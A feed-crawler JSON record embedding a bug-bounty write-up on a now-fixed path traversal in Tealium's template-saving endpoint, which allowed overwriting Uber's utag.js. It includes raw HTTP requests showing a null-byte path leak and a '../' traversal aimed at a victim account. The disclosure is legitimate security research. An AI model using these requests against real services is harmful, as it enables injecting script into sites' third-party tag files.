{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-07 05:36:25","updatedTime":"2020-09-07 05:36:25","title":"[BBP系列三] Hijack the JS File of Uber's Website","link":"http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/","description":"<h3 id=\"TLDR\"><a href=\"http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/#TLDR\" class=\"headerlink\" title=\"TLDR\"></a>TLDR</h3>\n<ol>\n <li>Almost all of Uber’s websites are loading JS file: <a href=\"https://tags.tiqcdn.com/utag/uber/main/prod/utag.js\" target=\"_blank\" rel=\"noopener\">https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</a> </li>\n <li>I found that the content of utag.js is updating from <code>/data/utui/data/accounts/uber/templates/main/utag.js</code> when deploying in my.tealiumiq.com. </li>\n <li>my.tealiumiq.com has a path traversal issue, which allow hacker to change <code>utag.js</code> of other account, including Uber’s.</li>\n <li>This bug had beed fixed 8 months ago. Bug Bounty: $6000.</li>\n</ol>\n<h3 id=\"My-Steps\"><a href=\"http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/#My-Steps\" class=\"headerlink\" title=\"My Steps\"></a>My Steps</h3>\n<p>I like asking myself some questions when hunting for bug bounty. Looking around about <code>https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</code>, I found Uber’s websites were using a third party service offered by <code>Tealium</code>. I asked myself: can I modify the content of <code>utag.js</code>? How?</p>\n<p>I registered two account and began my journey. WARNING: DO NOT TEST IN PRODUCTION USING TARGET ACCOUNT.</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg\" alt=\"\" /></p>\n<ul>\n <li>Post <code>/urest/legacy/saveTemplate</code> with <code>profile=main%00</code> to get the path in server</li>\n</ul>\n<figure class=\"highlight\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br /></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/urest/legacy/saveTemplate?utk=044925f62222711fdfec11dc6a4e7160e053d31e1a7f4774e8</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: my.tealiumiq.com</span><br><span class=\"line\">&lt;redated&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">account=evilaccount&amp;profile=main%00&amp;type=profile&amp;template=profile.loader&amp;code=%2F%2F+console.log(1)%3B%0A%0Aconsole.log(1)%3B</span><br /></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>Response<br>\n  <figure class=\"highlight json\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n     <td class=\"code\"><pre><span class=\"line\">{ <span class=\"attr\">\"message\"</span> : <span class=\"string\">\"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js\"</span>}</span><br /></pre></td>\n    </tr>\n   </table>\n  </figure></br></p>\n<p>As you can see, the <code>utag.loader</code> template path is <code>/data/utui/data/accounts/evilaccount/templates/main/utag.js</code></p>\n<ul>\n <li>Change the requst body to update the revision.loader</li>\n</ul>\n<figure class=\"highlight\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br /></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class=\"line\"></span><br><span class=\"line\">account=evilaccount&amp;profile=main%00&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230</span><br /></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>Response<br>\n  <figure class=\"highlight json\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n     <td class=\"code\"><pre><span class=\"line\">{ <span class=\"attr\">\"message\"</span> : <span class=\"string\">\"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js\"</span>}</span><br /></pre></td>\n    </tr>\n   </table>\n  </figure></br></p>\n<p>As you can see <code>201804081230</code> is appearing at the path. After testing, I found that I can insert <code>../</code> into this path, which means that I can change utag.js of any account, including Uber’s.</p>\n<figure class=\"highlight\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br /></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">account=evilaccount&amp;profile=main&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230/../../../../&lt;victimaccount&gt;/templates/main</span><br /></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>","descriptionType":"html","publishedDate":"Mon, 03 Dec 2018 05:11:08 +0000","feedId":40289,"bgimg":"https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg","linkMd5":"d5d1cb8db08cd608df1e5798811eb9b0","author":"","articleImgCdnMap":{"https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg":null},"publishedOrCreatedDate":1599428185769}],"record":{"createdTime":"2020-09-07 05:36:25","updatedTime":"2020-09-07 05:36:25","feedId":40289,"fetchDate":"Sun, 06 Sep 2020 21:36:25 +0000","fetchMs":54,"handleMs":199,"totalMs":244184,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"dccee34bd0b1e1e51aa26d54e37db631","hostName":"us-025*","requestId":"0c9cd691bc42452a8ee5d3278a43a08f_40289","contentType":"application/xml","totalBytes":0,"bgimgsTotal":1,"bgimgsGithubTotal":0,"articlesImgsTotal":1,"articlesImgsGithubTotal":0,"successGithubMap":{},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:20:14","updatedTime":"2020-09-07 03:20:14","id":40289,"name":"zhchbin","url":"http://zhchbin.github.io/atom.xml","subscriber":80,"website":null,"icon":"http://zhchbin.github.io/favicon.ico?v=5.0.1","icon_jsdelivr":null,"description":"","weekly":null,"link":"http://zhchbin.github.io"},"noPictureArticleList":[{"createdTime":"2020-09-07 05:40:29","updatedTime":"2020-09-07 05:40:29","id":null,"feedId":40289,"linkMd5":"d5d1cb8db08cd608df1e5798811eb9b0"}],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":0,"tmpBgImgCdnBytes":0,"extra4":{"start":1599428185513,"total":0,"statList":[{"spend":58,"msg":"获取xml内容"},{"spend":199,"msg":"解释文章"},{"spend":121495,"msg":"正文链接上传到cdn"},{"spend":122326,"msg":"上传封面图到cdn"},{"spend":1,"msg":"修正封面图上传失败重新上传"}]},"extra5":1,"extra6":0,"extra7ImgCdnFailResultVector":[null,null,null,null,null,null],"extra10_invalidATagHrefValue":{"http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/_#My-Steps":"http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/#My-Steps","http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/_#TLDR":"http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/#TLDR"},"extra111_proxyServerAndStatMap":{},"extra12ImgCdnSuccessResultVector":[],"successGithubMap":{},"failGithubMap":{}}